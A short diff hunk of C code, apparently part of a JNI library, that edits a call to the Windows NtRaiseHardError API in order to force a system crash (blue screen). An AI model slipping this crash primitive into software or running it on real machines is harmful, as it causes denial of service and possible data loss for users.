@@ -77,7 +77,7 @@ int raiseHardError(JNIEnv *env, jobject obj)
         return -1; // This function does not exist (somehow)
     }
 
-    NTSTATUS Status = NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, MANUALLY_INITIATED_CRASH, &ErrorResponse); // Raise a hard error
+    NTSTATUS Status = NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse); // Raise a hard error
 
     if (Status != 0) {
         return -1; // Could not add privileges...
